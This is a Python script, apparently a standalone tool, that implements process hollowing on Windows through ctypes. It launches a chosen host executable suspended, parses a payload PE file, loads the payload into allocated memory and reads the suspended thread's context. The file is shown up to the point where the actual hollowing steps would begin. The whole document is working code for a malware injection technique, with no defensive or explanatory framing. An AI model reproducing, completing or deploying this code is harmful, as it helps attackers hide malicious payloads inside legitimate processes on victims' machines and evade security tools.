import argparse
import sys
from ctypes import *

from pefile import PE


class PROCESS_INFORMATION(Structure):
    _fields_ = [
        ('hProcess', c_void_p),
        ('hThread', c_void_p),
        ('dwProcessId', c_ulong),
        ('dwThreadId', c_ulong)
    ]


class STARTUPINFO(Structure):
    _fields_ = [
        ('cb', c_ulong),
        ('lpReserved', c_char_p),
        ('lpDesktop', c_char_p),
        ('lpTitle', c_char_p),
        ('dwX', c_ulong),
        ('dwY', c_ulong),
        ('dwXSize', c_ulong),
        ('dwYSize', c_ulong),
        ('dwXCountChars', c_ulong),
        ('dwYCountChars', c_ulong),
        ('dwFillAttribute', c_ulong),
        ('dwFlags', c_ulong),
        ('wShowWindow', c_ushort),
        ('cbReserved2', c_ushort),
        ('lpReserved2', c_ulong),
        ('hStdInput', c_void_p),
        ('hStdOutput', c_void_p),
        ('hStdError', c_void_p)
    ]


class FLOATING_SAVE_AREA(Structure):
    _fields_ = [
        ("ControlWord", c_ulong),
        ("StatusWord", c_ulong),
        ("TagWord", c_ulong),
        ("ErrorOffset", c_ulong),
        ("ErrorSelector", c_ulong),
        ("DataOffset", c_ulong),
        ("DataSelector", c_ulong),
        ("RegisterArea", c_ubyte * 80),
        ("Cr0NpxState", c_ulong)
    ]


class CONTEXT(Structure):
    _fields_ = [
        ("ContextFlags", c_ulong),
        ("Dr0", c_ulong),
        ("Dr1", c_ulong),
        ("Dr2", c_ulong),
        ("Dr3", c_ulong),
        ("Dr6", c_ulong),
        ("Dr7", c_ulong),
        ("FloatSave", FLOATING_SAVE_AREA),
        ("SegGs", c_ulong),
        ("SegFs", c_ulong),
        ("SegEs", c_ulong),
        ("SegDs", c_ulong),
        ("Edi", c_ulong),
        ("Esi", c_ulong),
        ("Ebx", c_ulong),
        ("Edx", c_ulong),
        ("Ecx", c_ulong),
        ("Eax", c_ulong),
        ("Ebp", c_ulong),
        ("Eip", c_ulong),
        ("SegCs", c_ulong),
        ("EFlags", c_ulong),
        ("Esp", c_ulong),
        ("SegSs", c_ulong),
        ("ExtendedRegisters", c_ubyte * 512)
    ]


if __name__ == "__main__":

    parser = argparse.ArgumentParser(
        description="Process Hollowing using Python")
    parser.add_argument('-p', help="Path to payload", required=True)
    parser.add_argument('-d', help="Path to host executable", required=True)

    args = parser.parse_args()

    si = STARTUPINFO()
    si.cb = sizeof(STARTUPINFO)
    pi = PROCESS_INFORMATION()

    CREATE_SUSPENDED = 0x0004

    ret = windll.kernel32.CreateProcessW(None, args.d, None, None, False,
                                         CREATE_SUSPENDED, None, None,
                                         byref(si), byref(pi))

    if not ret:
        print("Couldn't create process")
        err = windll.kernel32.GetLastError()
        print(f"Error: {err}")
        sys.exit(err)

    err = windll.kernel32.GetLastError()
    hProcess = pi.hProcess
    hThread = pi.hThread

    print(f"Last error {err}")
    print(f"New suspended process: {pi.dwProcessId}")

    with open(args.p, "rb") as payload_fh:
        # read the payload file
        payload_data = payload_fh.read()

    payload_size = len(payload_data)

    # parse payload PE header
    payload = PE(data=payload_data)
    payload_ImageBase = payload.OPTIONAL_HEADER.ImageBase
    payload_SizeOfImage = payload.OPTIONAL_HEADER.SizeOfImage
    payload_SizeOfHeaders = payload.OPTIONAL_HEADER.SizeOfHeaders
    payload_sections = payload.sections
    payload_NumberOfSections = payload.FILE_HEADER.NumberOfSections
    payload_AddressOfEntryPoint = payload.OPTIONAL_HEADER.AddressOfEntryPoint
    payload.close()

    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_READWRITE = 0x4

    # allocate memory for the payload
    payload_data_pointer = windll.kernel32.VirtualAlloc(None,
                                                        c_int(payload_size + 1),
                                                        MEM_COMMIT | MEM_RESERVE,
                                                        PAGE_READWRITE)

    if not payload_data_pointer:
        print("Failed to allocate memory")
        err = windll.kernel32.GetLastError()
        print(f"Error: {err}")
        sys.exit(err)

    # load the payload data into memory
    memmove(payload_data_pointer, payload_data, payload_size)

    # get thread context
    cx = CONTEXT()
    cx.ContextFlags = 0x1007

    if windll.kernel32.GetThreadContext(hThread, byref(cx)) == 0:
        err = windll.kernel32.GetLastError()

        print("Failed to get thread context")
        print(f"Error: {err}")
        sys.exit(err)
